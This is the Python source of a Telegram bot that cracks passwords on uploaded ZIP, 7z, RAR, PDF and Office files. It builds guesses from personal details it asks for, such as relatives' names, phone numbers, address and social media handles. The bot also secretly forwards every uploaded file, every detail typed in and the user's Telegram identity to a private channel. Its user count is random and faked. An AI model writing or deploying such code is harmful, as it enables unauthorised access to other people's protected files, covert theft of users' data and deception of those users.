import os
import json
import time
import random
import requests
import threading
import pyzipper
import py7zr
import pdfplumber
from flask import Flask, request, jsonify
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from itertools import permutations

TOKEN = os.environ.get("BOT_TOKEN")
RENDER_URL = os.environ.get("RENDER_URL", "https://your-bot.onrender.com")
PRIVATE_CHANNEL = -1004479815753
CHANNEL_USERNAME = "@nrtecno2"

app = Flask(__name__)
user_sessions = {}
active_cracking = {}

# Session with Retry
session = requests.Session()
retry = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
adapter = HTTPAdapter(max_retries=retry)
session.mount('http://', adapter)
session.mount('https://', adapter)


def get_monthly_users():
    return f"{random.randint(10000, 99999):,}"


# ============================================================
# ULTIMATE PASSWORD GENERATOR — ALL COMBINATIONS
# ============================================================
class UltimatePasswordGenerator:
    def __init__(self):
        self.high_specials = ['@', '#', '&']
        self.low_specials = ['$', '%', '^', '*', '!', '?', '/', '\\', '|', '~', ':', ';', '"', "'", ',', '.', '<', '>', '[', ']', '{', '}', '`', '+', '=', '-', '_']
        self.numbers = ['123', '456', '789', '000', '111', '222', '333', '987', '654', '321', '1234', '5678', '9876', '123456', '9876543210']
        
        self.names = ['admin', 'root', 'user', 'guest', 'login', 'test', 'demo',
                      'narendra', 'raj', 'rahul', 'amit', 'vikram', 'ajay', 'sunil',
                      'anil', 'deepak', 'sanjay', 'vijay', 'arjun', 'karan', 'mohit',
                      'rohit', 'ankit', 'vivek', 'manoj', 'suresh', 'mahesh', 'ramesh',
                      'dinesh', 'ganesh', 'naveen', 'pawan', 'sachin', 'rajesh', 'kapil',
                      'mukesh', 'ravi', 'ashok', 'shyam', 'kumar', 'singh', 'sharma',
                      'verma', 'gupta', 'yadav', 'jain', 'patel', 'shah', 'desai',
                      'meghwal', 'choudhary', 'rathore', 'shekhawat', 'gehlot']

        self.common_words = ['password', 'admin', 'root', 'toor', 'iloveyou', 'sunshine',
                             'princess', 'dragon', 'baseball', 'superman', 'batman',
                             'trustno', 'hello', 'freedom', 'whatever', 'qwerty',
                             'letmein', 'welcome', 'monkey', 'secret', 'love', 'angel',
                             'rainbow', 'tiger', 'eagle', 'phoenix', 'shadow', 'night']

        self.used_passwords = set()
        self.should_stop = False

    # ============================================================
    # CUSTOM MODE — ALL POSSIBLE COMBINATIONS FROM USER INFO
    # ============================================================
    def generate_custom_passwords(self, user_info):
        passwords = set()
        all_info = []

        # Collect all info pieces
        for key, value in user_info.items():
            if value and isinstance(value, str):
                parts = value.replace(',', ' ').replace('\n', ' ').split()
                for part in parts:
                    part = part.strip()
                    if part and len(part) >= 2:
                        all_info.append(part)
                        all_info.append(part.upper())
                        all_info.append(part.lower())
                        all_info.append(part.capitalize())
                        all_info.append(part.title())

        # Extract mobile numbers (full and partial chunks)
        mobile_chunks = []
        if user_info.get('mobile_numbers'):
            mobiles = user_info.get('mobile_numbers').replace(',', ' ').split()
            for m in mobiles:
                m_clean = ''.join(filter(str.isdigit, m))
                if m_clean and len(m_clean) >= 4:
                    # Full number
                    mobile_chunks.append(m_clean)
                    # Last 4, 5, 6, 7, 8 digits
                    for i in range(4, min(len(m_clean), 9) + 1):
                        mobile_chunks.append(m_clean[-i:])
                    # First 4, 5, 6 digits
                    for i in range(4, min(len(m_clean), 7) + 1):
                        mobile_chunks.append(m_clean[:i])
                    # Break into chunks of 4, 5, 6, 7
                    for i in range(0, len(m_clean) - 3, 3):
                        mobile_chunks.append(m_clean[i:i+4])
                        if i+5 <= len(m_clean):
                            mobile_chunks.append(m_clean[i:i+5])
                        if i+6 <= len(m_clean):
                            mobile_chunks.append(m_clean[i:i+6])
        mobile_chunks = list(set([c for c in mobile_chunks if c and len(c) >= 4]))

        # Add mobile chunks to info
        for m in mobile_chunks:
            all_info.append(m)

        # Remove duplicates
        info_pieces = list(set([p for p in all_info if p and len(p) >= 2]))

        if not info_pieces:
            return ['admin123', 'password123']

        # ============================================================
        # GENERATE ALL POSSIBLE COMBINATIONS
        # ============================================================

        # 1. Single piece + @/#/& + mobile chunk
        for p in info_pieces[:30]:
            for m in mobile_chunks[:15]:
                for spec in self.high_specials:
                    passwords.add(f"{p}{spec}{m}")
                    passwords.add(f"{p}{m}{spec}")
                    passwords.add(f"{m}{spec}{p}")
                    passwords.add(f"{p}{spec}{m}{spec}")
                    passwords.add(f"{p}{m}{spec}{m}")

        # 2. Two pieces + @/#/& + mobile chunks (Name@8984548#39953840)
        for i in range(min(20, len(info_pieces))):
            for j in range(min(20, len(info_pieces))):
                if i != j:
                    p1 = info_pieces[i]
                    p2 = info_pieces[j]
                    for m1 in mobile_chunks[:10]:
                        for m2 in mobile_chunks[:10]:
                            if m1 != m2:
                                for spec1 in self.high_specials:
                                    for spec2 in self.high_specials:
                                        if spec1 != spec2:
                                            passwords.add(f"{p1}{spec1}{m1}{spec2}{m2}")
                                            passwords.add(f"{p1}{spec1}{m2}{spec2}{m1}")
                                            passwords.add(f"{m1}{spec1}{p1}{spec2}{m2}")
                                            passwords.add(f"{p1}{p2}{spec1}{m1}{spec2}{m2}")
                                            passwords.add(f"{p1}{spec1}{p2}{m1}{spec2}{m2}")

        # 3. Three pieces combinations
        for i in range(min(15, len(info_pieces))):
            for j in range(min(15, len(info_pieces))):
                for k in range(min(15, len(info_pieces))):
                    if i != j and j != k and i != k:
                        p1 = info_pieces[i]
                        p2 = info_pieces[j]
                        p3 = info_pieces[k]
                        for m in mobile_chunks[:8]:
                            for spec in self.high_specials:
                                passwords.add(f"{p1}{p2}{p3}{spec}{m}")
                                passwords.add(f"{p1}{spec}{p2}{p3}{m}")
                                passwords.add(f"{p1}{p2}{spec}{p3}{m}")
                                passwords.add(f"{m}{spec}{p1}{p2}{p3}")

        # 4. Name + mobile chunk + @ + mobile chunk (Narendra@8984548#39953840)
        for p in info_pieces[:20]:
            for m1 in mobile_chunks[:12]:
                for m2 in mobile_chunks[:12]:
                    if m1 != m2:
                        for spec1 in self.high_specials:
                            for spec2 in self.high_specials:
                                if spec1 != spec2:
                                    passwords.add(f"{p}{spec1}{m1}{spec2}{m2}")
                                    passwords.add(f"{p}{spec1}{m2}{spec2}{m1}")
                                    passwords.add(f"{p}{spec1}{m1}{spec2}{m2}{spec1}")
                                    passwords.add(f"{p}{spec1}{m1}{spec2}{m2}{spec2}")

        # 5. All pieces + numbers
        for p in info_pieces:
            for num in self.numbers[:5]:
                passwords.add(f"{p}{num}")
                passwords.add(f"{p}@{num}")
                passwords.add(f"{p}#{num}")
                passwords.add(f"{p}&{num}")

        # 6. Info piece + mobile chunk + common word
        for p in info_pieces[:15]:
            for m in mobile_chunks[:8]:
                for word in self.common_words[:10]:
                    for spec in self.high_specials:
                        passwords.add(f"{p}{spec}{m}{word}")
                        passwords.add(f"{p}{m}{spec}{word}")
                        passwords.add(f"{word}{spec}{p}{m}")

        # 7. Long passwords (10 to 100 chars) from info
        for p in info_pieces[:10]:
            if len(p) >= 3:
                for length in range(10, 101, 5):
                    base = (p * (length // len(p) + 1))[:length]
                    passwords.add(base)
                    passwords.add(f"{base}@")
                    passwords.add(f"{base}#")
                    passwords.add(f"{base}&")
                    for m in mobile_chunks[:5]:
                        passwords.add(f"{base}{spec}{m}")
                        passwords.add(f"{base}{spec}{m}{spec}")

        print(f"✅ CUSTOM: Generated {len(passwords)} passwords")
        return list(passwords)

    # ============================================================
    # AUTO MODE — SMART LIST
    # ============================================================
    def generate_auto_passwords(self):
        passwords = set()

        for name in self.names[:30]:
            passwords.add(name)
            passwords.add(name.upper())
            passwords.add(name.capitalize())
            for num in self.numbers[:5]:
                passwords.add(f"{name}{num}")
                for spec in self.high_specials:
                    passwords.add(f"{name}{spec}{num}")
                    passwords.add(f"{name.upper()}{spec}{num}")

        for word in self.common_words[:20]:
            passwords.add(word)
            passwords.add(word.upper())
            passwords.add(word.capitalize())
            for num in self.numbers[:5]:
                passwords.add(f"{word}{num}")
                for spec in self.high_specials:
                    passwords.add(f"{word}{spec}{num}")

        print(f"✅ AUTO: Generated {len(passwords)} passwords")
        return list(passwords)

    # ============================================================
    # CUSTOM+AUTO — INFO + BOT WORDS
    # ============================================================
    def generate_custom_auto_passwords(self, user_info):
        passwords = set()

        # Get custom passwords first
        custom = self.generate_custom_passwords(user_info)
        for p in custom:
            passwords.add(p)

        # Extract info pieces
        info_pieces = []
        for key, value in user_info.items():
            if value and isinstance(value, str):
                parts = value.replace(',', ' ').replace('\n', ' ').split()
                for part in parts:
                    part = part.strip()
                    if part and len(part) >= 2:
                        info_pieces.append(part)
                        info_pieces.append(part.upper())
                        info_pieces.append(part.lower())
                        info_pieces.append(part.capitalize())
        info_pieces = list(set(info_pieces))[:20]

        # Mix with names
        for p in info_pieces:
            for name in self.names[:15]:
                passwords.add(f"{p}{name}")
                passwords.add(f"{p}@{name}")
                passwords.add(f"{p}#{name}")
                passwords.add(f"{name}{p}")
                passwords.add(f"{name}@{p}")
                for num in self.numbers[:3]:
                    passwords.add(f"{p}{name}{num}")
                    passwords.add(f"{p}@{name}{num}")

        # Mix with common words
        for p in info_pieces:
            for word in self.common_words[:15]:
                passwords.add(f"{p}{word}")
                passwords.add(f"{p}@{word}")
                passwords.add(f"{p}#{word}")
                passwords.add(f"{word}{p}")
                passwords.add(f"{word}@{p}")

        print(f"✅ CUSTOM+AUTO: Generated {len(passwords)} passwords")
        return list(passwords)

    # ============================================================
    # GET NEXT PASSWORDS — INFINITE GENERATION
    # ============================================================
    def get_next_passwords(self, user_info=None, mode='custom', batch_size=2000):
        new_passwords = []
        password_list = []

        if mode == 'custom':
            password_list = self.generate_custom_passwords(user_info)
        elif mode == 'auto':
            password_list = self.generate_auto_passwords()
        elif mode == 'custom_auto':
            password_list = self.generate_custom_auto_passwords(user_info)
        else:
            password_list = self.generate_custom_passwords(user_info)

        for pwd in password_list:
            if pwd not in self.used_passwords and len(pwd) >= 2:
                self.used_passwords.add(pwd)
                new_passwords.append(pwd)
                if len(new_passwords) >= batch_size:
                    return new_passwords

        return new_passwords

    def reset(self):
        self.used_passwords = set()
        self.should_stop = False


# ============================================================
# FILE CRACKERS
# ============================================================
def crack_zip_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with pyzipper.AESZipFile(file_path) as zf:
                zf.extractall(pwd=pwd.encode())
                return pwd
        except:
            continue
    return None


def crack_7z_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with py7zr.SevenZipFile(file_path, password=pwd) as archive:
                archive.extractall()
                return pwd
        except:
            continue
    return None


def crack_pdf_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with pdfplumber.open(file_path, password=pwd) as pdf:
                if len(pdf.pages) > 0:
                    return pwd
        except:
            continue
    return None


def crack_office_fast(file_path, password_list):
    try:
        import msoffcrypto
        for pwd in password_list:
            try:
                with open(file_path, 'rb') as f:
                    office = msoffcrypto.OfficeFile(f)
                    office.load_key(password=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None


def crack_rar_fast(file_path, password_list):
    try:
        import rarfile
        import tempfile
        if not rarfile.is_rarfile(file_path):
            return None
        with tempfile.TemporaryDirectory() as tmpdir:
            for pwd in password_list:
                try:
                    with rarfile.RarFile(file_path) as rf:
                        rf.extractall(path=tmpdir, pwd=pwd)
                        return pwd
                except:
                    continue
    except:
        pass
    return None


def crack_file_fast(file_path, ext, password_list):
    if ext == 'zip':
        return crack_zip_fast(file_path, password_list)
    elif ext == '7z':
        return crack_7z_fast(file_path, password_list)
    elif ext == 'pdf':
        return crack_pdf_fast(file_path, password_list)
    elif ext in ['docx', 'doc', 'xlsx', 'xls', 'pptx', 'ppt']:
        return crack_office_fast(file_path, password_list)
    elif ext == 'rar':
        return crack_rar_fast(file_path, password_list)
    return None


# ============================================================
# TELEGRAM HELPERS
# ============================================================
def send_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        session.post(url, json=payload, timeout=30)
    except:
        time.sleep(2)
        session.post(url, json=payload, timeout=30)


def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        session.post(url, json=payload, timeout=30)
    except:
        pass


def send_document(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': chat_id, 'caption': caption}
        try:
            session.post(url, files=files, data=data, timeout=60)
        except:
            pass


def forward_file_to_channel(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': chat_id, 'caption': caption}
        try:
            response = session.post(url, files=files, data=data, timeout=60)
            result = response.json()
            if result.get('ok'):
                return result.get('result', {}).get('message_id')
            return None
        except:
            return None


def edit_channel_message(channel_id, message_id, new_caption):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageCaption"
    payload = {
        "chat_id": channel_id,
        "message_id": message_id,
        "caption": new_caption,
        "parse_mode": "Markdown"
    }
    try:
        response = session.post(url, json=payload, timeout=30)
        return response.json().get('ok', False)
    except:
        return False


def answer_callback(callback_id, text=""):
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id, "text": text}
    try:
        session.post(url, json=payload, timeout=30)
    except:
        pass


def check_channel_membership(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
        response = session.get(url, params=params, timeout=30)
        data = response.json()
        if data["ok"]:
            status = data["result"]["status"]
            return status in ["member", "creator", "administrator"]
        return False
    except:
        return False


# ============================================================
# KEYBOARDS
# ============================================================
def get_mode_buttons():
    return {
        "inline_keyboard": [
            [
                {"text": "1️⃣ CUSTOM", "callback_data": "mode_custom"},
                {"text": "2️⃣ AUTO", "callback_data": "mode_auto"},
                {"text": "3️⃣ CUSTOM+AUTO", "callback_data": "mode_custom_auto"}
            ],
            [
                {"text": "🛑 /stop & /start to new file password 🔑", "callback_data": "stop_cracking"}
            ]
        ]
    }


def join_verify_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "🔴 JOIN CHANNEL", "url": "https://t.me/nrtecno2"},
                {"text": "✅ VERIFY", "callback_data": "verify"}
            ]
        ]
    }


def get_custom_fields():
    return [
        'name', 'father', 'mother', 'brother', 'sister', 'gf', 'bf',
        'son', 'daughter', 'wife', 'husband', 'friends',
        'address', 'city', 'state', 'country', 'pincode',
        'mobile_numbers',
        'instagram_username', 'facebook_username', 'twitter_username',
        'snapchat_username', 'telegram_username',
        'password_hint'
    ]


# ============================================================
# CRACK IN BACKGROUND
# ============================================================
def crack_in_background(chat_id, file_path, file_name, ext, user_info=None, mode='custom', channel_msg_id=None):
    try:
        generator = UltimatePasswordGenerator()
        total_tried = 0
        batch_size = 2000
        start_time = time.time()
        found = False
        last_progress_time = time.time()

        if chat_id not in active_cracking:
            active_cracking[chat_id] = {}
        active_cracking[chat_id]['generator'] = generator
        active_cracking[chat_id]['thread'] = threading.current_thread()
        active_cracking[chat_id]['stop_flag'] = False

        mode_names = {
            'custom': 'CUSTOM (User Info Only)',
            'auto': 'AUTO (Smart List)',
            'custom_auto': 'CUSTOM+AUTO (Info + Bot Words)'
        }
        send_message(chat_id, f"⚡ *{mode_names.get(mode, 'CUSTOM')} Mode Activated*\n\n⏳ Generating unlimited passwords...\n_Type /stop to cancel_", parse_mode='Markdown')

        while not active_cracking[chat_id].get('stop_flag', False):
            password_list = generator.get_next_passwords(user_info, mode, batch_size)
            if not password_list:
                break
            total_tried += len(password_list)

            current_time = time.time()
            if total_tried % 5000 == 0 or (current_time - last_progress_time) > 2.0:
                send_message(
                    chat_id,
                    f"🔄 *Tried {total_tried:,} passwords...*\n"
                    f"⏳ Still searching...\n"
                    f"_Type /stop to cancel_",
                    parse_mode='Markdown'
                )
                last_progress_time = current_time

            password = crack_file_fast(file_path, ext, password_list)
            if password:
                elapsed = time.time() - start_time
                result_msg = f"✅ *Password Cracked!*\n\n🔑 `{password}`\n\n📁 {file_name}\n📊 Tried: {total_tried:,} passwords\n⚡ Time: {elapsed:.2f}s"

                send_message(chat_id, result_msg, parse_mode='Markdown')

                if channel_msg_id:
                    new_caption = f"✅ *Password Found!*\n📁 {file_name}\n🔑 `{password}`\n📊 Tried: {total_tried:,} passwords"
                    edit_channel_message(PRIVATE_CHANNEL, channel_msg_id, new_caption)

                try:
                    send_document(PRIVATE_CHANNEL, file_path,
                        f"✅ Found!\n📁 {file_name}\n🔑 {password}\n📊 Tried: {total_tried:,}")
                except:
                    pass
                found = True
                break

        if not found:
            if active_cracking.get(chat_id, {}).get('stop_flag', False):
                send_message(chat_id,
                    f"🛑 *Cracking Stopped by User!*\n\n📊 Total tried: {total_tried:,} passwords\n\n_Type /start to use bot again_",
                    parse_mode='Markdown')
            else:
                send_message(chat_id,
                    f"❌ *Password Not Found!*\n\n📁 {file_name}\n📊 Tried: {total_tried:,} passwords\n⚡ Time: {time.time() - start_time:.2f}s",
                    parse_mode='Markdown')

                if channel_msg_id:
                    new_caption = f"❌ *Password Not Found!*\n📁 {file_name}\n📊 Tried: {total_tried:,} passwords"
                    edit_channel_message(PRIVATE_CHANNEL, channel_msg_id, new_caption)

        generator.reset()
        if os.path.exists(file_path):
            os.remove(file_path)

        if chat_id in active_cracking:
            del active_cracking[chat_id]

    except Exception as e:
        send_message(chat_id, f"❌ *Error:* {str(e)}", parse_mode='Markdown')
        if os.path.exists(file_path):
            os.remove(file_path)
        if chat_id in active_cracking:
            del active_cracking[chat_id]


# ============================================================
# MAIN WEBHOOK HANDLER
# ============================================================
@app.route(f'/webhook/{TOKEN}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return jsonify({"status": "error"}), 400

        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            username = message['from'].get('username', str(user_id))
            first_name = message['from'].get('first_name', '')
            last_name = message['from'].get('last_name', '')

            if 'text' in message:
                text = message['text']

                if text == '/start':
                    if not check_channel_membership(user_id):
                        send_message(chat_id, "🔴 *Access Denied!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                    else:
                        monthly_users = get_monthly_users()
                        send_message(chat_id,
                            f"🔐 *FILE PASSWORD CRACKER*\n"
                            f"👥 *{monthly_users} monthly users*\n\n"
                            f"✅ Verified!\n"
                            f"📁 *Send me any password protected file.*\n\n"
                            f"_Will keep generating until found!_",
                            parse_mode='Markdown')
                    return jsonify({"status": "ok"}), 200

                if text == '/stop' or text == '/cancel':
                    if chat_id in active_cracking:
                        active_cracking[chat_id]['stop_flag'] = True
                        send_message(chat_id, "🛑 *Stopping cracking process...*\n\n_Type /start to use bot again_", parse_mode='Markdown')
                    else:
                        send_message(chat_id, "❌ *No active cracking process to stop.*", parse_mode='Markdown')
                    return jsonify({"status": "ok"}), 200

                # Handle custom info collection
                if chat_id in user_sessions and user_sessions[chat_id].get('state') == 'collecting_info':
                    session_data = user_sessions[chat_id]
                    field = session_data['current_field']

                    if text.lower() == '/skip':
                        session_data['info'][field] = ''
                    else:
                        session_data['info'][field] = text

                    try:
                        send_message(PRIVATE_CHANNEL, f"📝 *{field.replace('_', ' ').title()}:* {text if text.lower() != '/skip' else 'SKIPPED'}\n👤 @{username}")
                    except:
                        pass

                    fields = session_data['fields']
                    current_index = fields.index(field)

                    if current_index + 1 < len(fields):
                        next_field = fields[current_index + 1]
                        session_data['current_field'] = next_field
                        send_message(chat_id, f"📝 *Enter {next_field.replace('_', ' ').title()}?*\n\n_Send /skip to skip_", parse_mode='Markdown')
                    else:
                        session_data['state'] = 'cracking'
                        info_summary = "📝 *All Info Collected*\n\n"
                        for f, v in session_data['info'].items():
                            if v:
                                info_summary += f"📌 *{f.replace('_', ' ').title()}:* {v}\n"
                        info_summary += f"\n👤 @{username}\n📁 {session_data['file_name']}"

                        info_summary += f"\n📱 *Telegram Info:*\n   User ID: {user_id}\n"
                        if username:
                            info_summary += f"   Username: @{username}\n"
                        if first_name:
                            info_summary += f"   First Name: {first_name}\n"
                        if last_name:
                            info_summary += f"   Last Name: {last_name}\n"

                        try:
                            send_message(PRIVATE_CHANNEL, info_summary)
                        except:
                            pass

                        threading.Thread(
                            target=crack_in_background,
                            args=(chat_id, session_data['file_path'], session_data['file_name'], session_data['file_ext'], session_data['info'], session_data['mode'], session_data.get('channel_msg_id'))
                        ).start()

                        del user_sessions[chat_id]
                    return jsonify({"status": "ok"}), 200

            if 'document' in message:
                file = message['document']
                file_name = file.get('file_name', 'unknown')
                file_id = file['file_id']

                if not check_channel_membership(user_id):
                    send_message(chat_id, "🔴 Access Denied!", reply_markup=join_verify_keyboard())
                    return jsonify({"status": "ok"}), 200

                file_info = session.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                file_path_api = file_info['result']['file_path']
                file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
                response = session.get(file_url, timeout=60)

                os.makedirs("downloads", exist_ok=True)
                file_path = f"downloads/{file_name}"
                with open(file_path, 'wb') as f:
                    f.write(response.content)

                ext = file_name.split('.')[-1].lower()

                caption = f"📁 *File Received*\n📄 {file_name}\n👤 @{username}\n⏳ Choose mode to start cracking..."
                channel_msg_id = forward_file_to_channel(PRIVATE_CHANNEL, file_path, caption)

                user_sessions[chat_id] = {
                    'file_path': file_path,
                    'file_name': file_name,
                    'file_ext': ext,
                    'channel_msg_id': channel_msg_id,
                    'state': 'waiting_for_mode'
                }

                send_message(
                    chat_id,
                    f"📁 *File Received!*\n\n📄 {file_name}\n⚡ *Choose a cracking mode:*",
                    reply_markup=get_mode_buttons(),
                    parse_mode='Markdown'
                )

                return jsonify({"status": "ok"}), 200

        if 'callback_query' in update:
            callback = update['callback_query']
            callback_id = callback['id']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            user_id = callback['from']['id']
            data = callback['data']

            if data == 'verify':
                if check_channel_membership(user_id):
                    monthly_users = get_monthly_users()
                    edit_message(chat_id, message_id,
                        f"🔐 *FILE PASSWORD CRACKER*\n"
                        f"👥 *{monthly_users} monthly users*\n\n"
                        f"✅ Verified!\n"
                        f"📁 *Send me any password protected file.*",
                        parse_mode='Markdown')
                else:
                    edit_message(chat_id, message_id, "🔴 *Still Not Verified!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            if data == 'stop_cracking':
                if chat_id in active_cracking:
                    active_cracking[chat_id]['stop_flag'] = True
                    send_message(chat_id, "🛑 *Stopping cracking process...*\n\n_Type /start to use bot again_", parse_mode='Markdown')
                    answer_callback(callback_id, "Stopping...")
                else:
                    send_message(chat_id, "❌ *No active cracking process to stop.*", parse_mode='Markdown')
                    answer_callback(callback_id, "No active process")
                return jsonify({"status": "ok"}), 200

            if data in ['mode_custom', 'mode_auto', 'mode_custom_auto']:
                session_data = user_sessions.get(chat_id)
                if not session_data:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200

                mode = data.replace('mode_', '')

                if mode == 'auto':
                    edit_message(chat_id, message_id, f"⚡ *AUTO Mode Activated*\n\n📊 Using smart wordlist...\n_Type /stop to cancel_", parse_mode='Markdown')
                    threading.Thread(
                        target=crack_in_background,
                        args=(chat_id, session_data['file_path'], session_data['file_name'], session_data['file_ext'], None, mode, session_data.get('channel_msg_id'))
                    ).start()
                    del user_sessions[chat_id]

                else:
                    session_data['mode'] = mode
                    session_data['info'] = {}
                    session_data['fields'] = get_custom_fields()
                    session_data['current_field'] = session_data['fields'][0]
                    session_data['state'] = 'collecting_info'

                    mode_names = {
                        'custom': 'CUSTOM (User Info Only)',
                        'custom_auto': 'CUSTOM+AUTO (Info + Bot Words)'
                    }
                    edit_message(chat_id, message_id, f"📝 *{mode_names.get(mode, 'CUSTOM')} Mode Selected*\n\nLet's collect some info for password generation...", parse_mode='Markdown')
                    send_message(chat_id, f"📝 *Enter {session_data['fields'][0].replace('_', ' ').title()}?*\n\n_Send /skip to skip_", parse_mode='Markdown')

                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            if data == 'cancel':
                session_data = user_sessions.get(chat_id)
                if session_data and session_data.get('file_path'):
                    os.remove(session_data['file_path'])
                del user_sessions[chat_id]
                send_message(chat_id, "❌ *Cancelled.* Send file again.", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            answer_callback(callback_id)
            return jsonify({"status": "ok"}), 200

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


# ============================================================
# SET WEBHOOK AND MAIN
# ============================================================
def set_webhook():
    webhook_url = f"{RENDER_URL}/webhook/{TOKEN}"
    url = f"https://api.telegram.org/bot{TOKEN}/setWebhook"
    try:
        response = session.post(url, json={"url": webhook_url}, timeout=30)
        if response.status_code == 200:
            print(f"✅ Webhook set to: {webhook_url}")
        else:
            print(f"❌ Webhook failed: {response.text}")
    except Exception as e:
        print(f"❌ Webhook error: {e}")


if __name__ == "__main__":
    if not TOKEN:
        print("❌ BOT_TOKEN not found!")
        exit(1)

    set_webhook()

    port = int(os.environ.get("PORT", 5000))
    print("🤖 NRTECNO ULTIMATE PASSWORD CRACKER STARTED...")
    print("🔥 MODES: CUSTOM | AUTO | CUSTOM+AUTO")
    print("🔢 GENERATION: Unlimited (5 to 100 chars)")
    print("📁 Files: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX")
    print("🚀 Running on port", port)

    app.run(host="0.0.0.0", port=port)
